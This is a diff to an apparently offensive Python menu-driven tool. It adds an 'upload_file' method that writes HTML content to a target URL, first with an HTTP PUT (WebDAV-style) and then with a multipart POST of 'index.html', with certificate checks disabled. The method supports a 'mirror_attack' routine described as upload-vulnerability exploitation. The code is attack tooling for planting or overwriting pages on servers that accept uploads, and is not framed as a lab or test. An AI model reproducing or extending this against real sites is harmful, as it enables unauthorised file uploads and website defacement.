@@ -298,6 +298,42 @@ __________                 ________          _____
                 break
             else:
                 print("[-] Invalid choice. Please select 1-16")
+            
+            # Pause before showing menu again
+            if choice != "16":
+                input("\nPress Enter to return to menu...")
+                print("\033[F\033[K", end="")  # Move cursor up and clear line
+
+    def upload_file(self, url, content):
+        """Attempt to upload a file to the target URL"""
+        try:
+            # Try PUT method first (common in WebDAV)
+            response = self.session.put(
+                url,
+                data=content,
+                headers={'Content-Type': 'text/html'},
+                verify=False,
+                timeout=10
+            )
+            
+            if response.status_code in [200, 201, 204]:
+                return True
+            
+            # If PUT fails, try POST (for form-based uploads)
+            files = {'file': ('index.html', content)}
+            response = self.session.post(
+                url,
+                files=files,
+                verify=False,
+                timeout=10
+            )
+            
+            return response.status_code == 200
+            
+        except Exception as e:
+            if args.verbose:
+                print(f"[-] Upload failed to {url}: {str(e)}")
+            return False
 
     def mirror_attack(self):
         """Advanced mirroring attack with upload vulnerability exploitation"""
